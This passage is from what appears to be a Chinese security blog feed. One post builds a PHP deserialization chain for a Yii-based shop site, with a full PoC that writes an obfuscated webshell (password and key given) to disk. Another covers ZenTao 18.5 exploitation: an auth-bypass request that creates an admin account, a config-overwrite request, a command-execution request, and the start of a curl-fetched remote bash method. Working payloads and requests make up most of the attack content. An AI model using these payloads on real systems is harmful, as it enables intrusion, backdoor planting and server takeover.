class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class BufferStream&#123;</span><br><span class="line">        private $buffer = &#x27;&#x27;;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;buffer=&quot;123&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class CachingStream&#123;</span><br><span class="line">        private $remoteStream;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;remoteStream=new BufferStream();</span><br><span class="line">            $this-&gt;stream=new PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class AppendStream&#123;</span><br><span class="line">        private $streams = [];</span><br><span class="line">        private $seekable = true;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;streams[]=new CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    use GuzzleHttp\Psr7\AppendStream;</span><br><span class="line">    class Swift_ByteStream_FileByteStream &#123;</span><br><span class="line">        private $path;</span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $this-&gt;path = new AppendStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    echo urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream()));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="PumpStream-read"><a href="#PumpStream-read" class="headerlink" title="PumpStream-&gt;read()"></a>PumpStream-&gt;read()</h3><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009112257328.png" class=""><p>这里的执行顺序为\vendor\guzzlehttp\psr7\src\PumpStream.php-&gt;read()-&gt;pump()-&gt;call_user_func()<br>其中要执行到call_user_func需要满足if($remaining)条件，需要$data &#x3D; $this-&gt;buffer-&gt;read($length);这段代码返回一个字符串<br>这里调用Behat\Gherkin\Cache\MemoryCache来满足条件</p><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009113206394.png" class=""><p>现在就执行到了call_user_func方法了<br>但是只有第一个参数可控，第二个参数不可控，代表可执行任意方法，但是参数不可控，在其他文章中到这里后下一步都是调用yii&#x2F;rest&#x2F;IndexAction.php的run方法</p><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009113709545.png" class=""><p>这里就可以执行任意方法，并且参数可控，这里只能利用单参数方法，但是因为disable_functions和php版本是7，基本都利用不了了，在其他文章中都是使用反序列化闭包函数来利用的，但是目标环境没这个依赖，所以就要找新的利用点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;../test/closure/autoload.php&quot;);</span><br><span class="line">$a = function()&#123;phpinfo();&#125;;</span><br><span class="line">$a = \Opis\Closure\serialize($a);</span><br><span class="line">$b = unserialize($a);</span><br><span class="line">$this-&gt;source=$b;</span><br></pre></td></tr></table></figure><h3 id="ExpressionDependency-generateDependencyData"><a href="#ExpressionDependency-generateDependencyData" class="headerlink" title="ExpressionDependency-&gt;generateDependencyData()"></a>ExpressionDependency-&gt;generateDependencyData()</h3><img src="/2024/09/26/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BE%E5%8C%A0%E5%95%86%E5%9F%8Eyii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8C%96%E6%8E%98/file-20241009114511593.png" class=""><p>这里eval中的$this-&gt;expression可控，就代表可以直接代码执行<br>但是因为方法的修饰符是protected，不能直接调用，就看ExpressionDependency的父类Dependency中调用generateDependencyData方法的地方<br>这里找的是evaluateDependency方法，到这里就构成了一条代码执行的反序列化链了</p><h2 id="反序列化链poc"><a href="#反序列化链poc" class="headerlink" title="反序列化链poc"></a>反序列化链poc</h2><p>密码:Tas9er 密钥:dkddixN 有效载荷:PhpDynamicPayload 加密器:PHP_XOR_BASE64<br>这里写的哥斯拉马中特殊字符需要转义下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace yii\caching&#123;</span><br><span class="line">    class ExpressionDependency&#123;</span><br><span class="line">        public $expression;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;expression=&#x27;file_put_contents(&quot;./template1.php&quot;,&quot;&lt;?pHP</span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(Chr(\&quot;48\&quot;));</span><br><span class="line">@error_reporting/*fuckgovv4aqxTHvS2*/(Chr(\&quot;48\&quot;));</span><br><span class="line">function baiduxoQT5mlorCt(/*fuckgovoDDTh*/\$baiduE0tpwHWAmC,\$baiduVhMR)&#123;</span><br><span class="line">    for(\$baidu9MbYZG=Chr(\&quot;48\&quot;);\$baidu9MbYZG&lt;strlen(\$baiduE0tpwHWAmC);\$baidu9MbYZG++) &#123;</span><br><span class="line">        \$baidua1Z4cz = \$baiduVhMR[\$baidu9MbYZG+Chr(\&quot;49\&quot;)&amp;15];</span><br><span class="line">        \$baiduE0tpwHWAmC[\$baidu9MbYZG] = \$baiduE0tpwHWAmC[\$baidu9MbYZG]^\$baidua1Z4cz;</span><br><span class="line">    &#125;</span><br><span class="line">    return \$baiduE0tpwHWAmC;</span><br><span class="line">&#125;</span><br><span class="line">\$baiduzZQQjX3kI5QJ = \&quot;bas\&quot;.\&quot;e6\&quot;.Chr(\&quot;52\&quot;).\&quot;_\&quot;.\&quot;de\&quot;.\&quot;cod\&quot;.Chr(\&quot;101\&quot;);</span><br><span class="line">\$base64_baiduxoQT5mlorCt = \&quot;bas\&quot;.\&quot;e6\&quot;.Chr(\&quot;52\&quot;).\&quot;_e\&quot;.Chr(\&quot;110\&quot;).Chr(\&quot;99\&quot;).\&quot;ode\&quot;;</span><br><span class="line">\$baiduk2wU=(\&quot;&amp;\&quot;^\&quot;r\&quot;).(\&quot;7\&quot;^\&quot;V\&quot;).(\&quot;I\&quot;^\&quot;:\&quot;).(\&quot;p\&quot;^\&quot;I\&quot;).(\&quot;_\&quot;^\&quot;:\&quot;).\$baiduzZQQjX3kI5QJ(\$baiduzZQQjX3kI5QJ(\&quot;Y2c9PQ==\&quot;));</span><br><span class="line">\$baiduIKJP47aD3N2h=\&#x27;p\&#x27;.\$baiduzZQQjX3kI5QJ(\$baiduzZQQjX3kI5QJ(\&quot;WVhsc2IyRms=\&quot;));</span><br><span class="line">\$baiduo40ArI30MXpOh=\&#x27;5da27e29\&#x27;.\$baiduzZQQjX3kI5QJ(\&quot;OTQ5YjllZmY=\&quot;);</span><br><span class="line">\$baidueA6Qmqt1OY1dpQ=(\&quot;!\&quot;^\&quot;@\&quot;).\&#x27;ss\&#x27;.Chr(\&quot;101\&quot;).\&#x27;rs\&#x27;;</span><br><span class="line">\$baidueA6Qmqt1OY1dpQ++;</span><br><span class="line">if (isset(\$_POST/*fuckgov3mCAtR*/[\$baiduk2wU]))&#123;</span><br><span class="line">    \$datbaidueA6Qmqt1OY1dpQ=baiduxoQT5mlorCt/*fuckgovac5q7m4jr7COuYs*/(\$baiduzZQQjX3kI5QJ(\$_POST[\$baiduk2wU]),\$baiduo40ArI30MXpOh);</span><br><span class="line">    if (/*fuckgovXMeIqBm*/isset(\$_SESSION/*fuckgovyboolhlD*/[\$baiduIKJP47aD3N2h]))&#123;</span><br><span class="line">        \$baidu1TilWNsaOuFd6=baiduxoQT5mlorCt(\$_SESSION/*fuckgovZ5yrIVQc11MJwQ7*/[\$baiduIKJP47aD3N2h],\$baiduo40ArI30MXpOh);</span><br><span class="line">        if (/*fuckgovbfzWTi8VVJweWpR*/strpos(\$baidu1TilWNsaOuFd6,\$baiduzZQQjX3kI5QJ/*fuckgovNQ6hM9tkxpurUd*/(\$baiduzZQQjX3kI5QJ(\&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=\&quot;)))===false)&#123;</span><br><span class="line">            \$baidu1TilWNsaOuFd6=baiduxoQT5mlorCt/*fuckgovJ8S2PNMXpD7l50g*/(\$baidu1TilWNsaOuFd6,\$baiduo40ArI30MXpOh);</span><br><span class="line">        &#125;</span><br><span class="line">        define(\&quot;baiduXMNuY8BGPxBwazP\&quot;,\&quot;//baiduQekmw\r\n\&quot;.\$baidu1TilWNsaOuFd6);</span><br><span class="line">        eval(baiduXMNuY8BGPxBwazP);</span><br><span class="line">        echo substr(/*fuckgov7eFT8HZkeSERjy*/md5/*fuckgovczn5VlPT3MtJE9O*/(\$baiduk2wU.\$baiduo40ArI30MXpOh),Chr(\&quot;48\&quot;),16);</span><br><span class="line">        echo \$base64_baiduxoQT5mlorCt(baiduxoQT5mlorCt(@run(\$datbaidueA6Qmqt1OY1dpQ),\$baiduo40ArI30MXpOh));</span><br><span class="line">        echo substr(/*fuckgov9BebET2KyiratDN*/md5/*fuckgovCnpB8Xt5QH*/(\$baiduk2wU.\$baiduo40ArI30MXpOh),16);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if (strpos/*fuckgovgXWkYn7xCQSm*/(\$datbaidueA6Qmqt1OY1dpQ,\$baiduzZQQjX3kI5QJ(\$baiduzZQQjX3kI5QJ(\&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=\&quot;)))!==false)&#123;</span><br><span class="line">            \$_SESSION[\$baiduIKJP47aD3N2h]=baiduxoQT5mlorCt(\$datbaidueA6Qmqt1OY1dpQ,\$baiduo40ArI30MXpOh);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&quot;)&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    use Behat\Gherkin\Cache\MemoryCache;</span><br><span class="line">    use yii\caching\ExpressionDependency;</span><br><span class="line">    class PumpStream&#123;</span><br><span class="line">        private $size=-10;</span><br><span class="line">        private $source;</span><br><span class="line">        private $buffer;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;buffer=new MemoryCache();</span><br><span class="line">            $this-&gt;source=[new ExpressionDependency(),&#x27;evaluateDependency&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Behat\Gherkin\Cache&#123;</span><br><span class="line">    class MemoryCache&#123;</span><br><span class="line">        private $features = array();</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;features[10]=123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class BufferStream&#123;</span><br><span class="line">        private $buffer = &#x27;&#x27;;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;buffer=&quot;123&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class CachingStream&#123;</span><br><span class="line">        private $remoteStream;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;remoteStream=new BufferStream();</span><br><span class="line">            $this-&gt;stream=new PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace GuzzleHttp\Psr7&#123;</span><br><span class="line">    class AppendStream&#123;</span><br><span class="line">        private $streams = [];</span><br><span class="line">        private $seekable = true;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;streams[]=new CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    use GuzzleHttp\Psr7\AppendStream;</span><br><span class="line">    class Swift_ByteStream_FileByteStream &#123;</span><br><span class="line">        private $path;</span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $this-&gt;path = new AppendStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    echo urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream()));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> yii </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次禅道后台getshell</title>
      <link href="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/"/>
      <url>/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/</url>
      
        <content type="html"><![CDATA[<p>在一次项目中，遇到了目标站有禅道，是18.5的版本</p><p>通过身份认证绕过漏洞(QVD-2024-15263)成功创建了管理员账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /zentao/api.php?m=testcase&amp;f=savexmindimport&amp;HTTP_X_REQUESTED_WITH=XMLHttpRequest&amp;productID=dddidkyodsnfamzvjidb&amp;branch=klmnehgxnsmeuhshbooy HTTP/1.1</span><br><span class="line">Host: chandao.xxxxxx.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line">Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /zentao/api.php/v1/users HTTP/1.1</span><br><span class="line">Host: chandao.xxxxxx.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line">Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8</span><br><span class="line">Referer: http://chandao.xxx.com/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: zentaosid=cba3a63a6329df52e6c636dba98aaa22</span><br><span class="line">Content-Length: 87</span><br><span class="line"></span><br><span class="line">&#123;&quot;account&quot;:&quot;saifel2&quot;,&quot;password&quot;:&quot;123456Qwe..&quot;,&quot;realname&quot;:&quot;saifei&quot;,&quot;role&quot;:&quot;&quot;,&quot;group&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure><p>翻了翻内容，没啥有用的东西，就收集了一波账号</p><p>想rce，看了哈公告都说后续可以命令执行，就到处翻文章看</p><p>在知识星球翻到大佬分析文章</p><img src="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/204c57ee-942f-4568-aef6-fcc3c2626026.png" class="" title="204c57ee-942f-4568-aef6-fcc3c2626026"><h2 id="通过任意配置覆盖漏洞RCE"><a href="#通过任意配置覆盖漏洞RCE" class="headerlink" title="通过任意配置覆盖漏洞RCE"></a>通过任意配置覆盖漏洞RCE</h2><p>在文章中，分享了通过任意配置覆盖漏洞RCE，但是没给具体利用方法，就本地搭建了环境分析了一波</p><img src="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/0f95f34f-ef0f-419e-9918-1f2db9673bfd.png" class="" title="0f95f34f-ef0f-419e-9918-1f2db9673bfd"><p>先看api下面的getModel方法，可以call_user_func_array 执行任意模块的方法，且parse_str支持urldecode。但是默认被禁用，需要$this-&gt;config-&gt;features-&gt;apiGetModel值为true</p><img src="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/850c167b-5f03-4af1-ab5e-588a8bfa3159.png" class="" title="850c167b-5f03-4af1-ab5e-588a8bfa3159"><img src="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/4a5a2074-2ab2-4a8a-a70a-bd1aaca96a0b.png" class="" title="4a5a2074-2ab2-4a8a-a70a-bd1aaca96a0b"><p>这个值是禅道通过读取配置文件获取的，默认关闭</p><p>但是在调用module的方法的时候会调用framework&#x2F;base&#x2F;router.class.php的mergeconfig方法读取数据库中zt_config的数据进行全局覆盖</p><img src="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/06345446-9042-412b-a536-0901c9280d47.png" class="" title="06345446-9042-412b-a536-0901c9280d47"><p>因为需要config-&gt;features-&gt;apiGetModel值为true，而且moduleName的值没办法为features，所以就需要$config2Merge &#x3D; $config并且$config2Merge-&gt;{$item-&gt;section}-&gt;{$item-&gt;key} &#x3D; $item-&gt;value，所以需要满足moduleName的值为common并且section为features</p><p>分析发现会默认调用module&#x2F;common&#x2F;model.php的loadconfigfromdb方法并且modulename值为common</p><img src="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/506fd8cd-9e37-4f18-a55e-497b81fe6fc8.png" class="" title="506fd8cd-9e37-4f18-a55e-497b81fe6fc8"><p>所以当数据里面的数据为下面内容的时候，通过mergeconfig方法，就使得config-&gt;features-&gt;apiGetModel值为true</p><img src="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/dcd0dca8-5101-4791-b4db-1b282a87a28f.png" class="" title="dcd0dca8-5101-4791-b4db-1b282a87a28f"><h3 id="任意配置覆盖"><a href="#任意配置覆盖" class="headerlink" title="任意配置覆盖"></a>任意配置覆盖</h3><p>现在就需要找可以修改配置的地方，pdf中给出了修改配置地址</p><p><a href="https://github.com/easysoft/zentaopms/commit/24b3fba6c0077bfc7bcc94af505d43856377186b">https://github.com/easysoft/zentaopms/commit/24b3fba6c0077bfc7bcc94af505d43856377186b</a></p><p>module&#x2F;custom&#x2F;control.php下面的ajaxSaveCustomFields方法中可以任意修改</p><img src="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/48e7b355-f7d6-48c8-9a96-13564a38f654.png" class="" title="48e7b355-f7d6-48c8-9a96-13564a38f654"><p>构造请求包，然后查看数据库发现配置被写了进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /zentaopms/www/index.php?m=custom&amp;f=ajaxSaveCustomFields&amp;module=common&amp;section=features&amp;key=apiGetModel HTTP/1.1</span><br><span class="line">Host: 192.168.234.128</span><br><span class="line">Content-Length: 11</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://192.168.234.128</span><br><span class="line">Referer: http://192.168.234.128/zentaopms/www/index.php?m=projectstory&amp;f=story&amp;projectID=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span><br><span class="line">Cookie: zentaosid=t33hnj6nnkdkjcid7rp3bdl63e;</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">fields=true</span><br></pre></td></tr></table></figure><p>现在调用getModel方法，发现可以使用</p><img src="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/a75c1c9f-766f-4b03-ac12-96fe79c7cfb1.png" class="" title="a75c1c9f-766f-4b03-ac12-96fe79c7cfb1"><h3 id="apiGetModel利用"><a href="#apiGetModel利用" class="headerlink" title="apiGetModel利用"></a>apiGetModel利用</h3><p>因为getModel可以调用任意module下面的方法，我调用的是checkConnection来进行rce</p><img src="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/e904be7f-55d2-4488-948d-a01296002555.png" class="" title="e904be7f-55d2-4488-948d-a01296002555"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /zentaopms/www/index.php?m=api&amp;f=getModel&amp;moduleName=repo&amp;methodName=checkConnection HTTP/1.1</span><br><span class="line">Host: 192.168.234.128</span><br><span class="line">accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span><br><span class="line">Referer: http://192.168.234.128/zentaopms/www/index.php</span><br><span class="line">Cookie: zentaosid=t33hnj6nnkdkjcid7rp3bdl63e;</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">client=calc.exe&amp;SCM=Subversion</span><br></pre></td></tr></table></figure><p>这里不知道为什么header头必须要有Referer，不然$_POST就为空，导致直接返回false</p><img src="/2024/09/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0getshell/d5c5df5d-d43e-43e5-a2d3-a053def4533e.png" class="" title="d5c5df5d-d43e-43e5-a2d3-a053def4533e"><h2 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h2><p>后续在目标linux环境下利用发现执行的命令被拼接并且过滤了特殊字符</p><p>后面找到几种方式绕过限制</p><h3 id="curl远程执行bash"><a href="#curl远程执行bash" class="headerlink" title="curl远程执行bash"></a>curl远程执行bash</h3><p>可以在vps上创建一个bash脚本然后通过curl远程执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api-getModel-repo-checkConnection.html HTTP/1.1</span><br><span class="line">Host: 192.168.234.130:8080</span><br><span class="line">Accept: application/json, 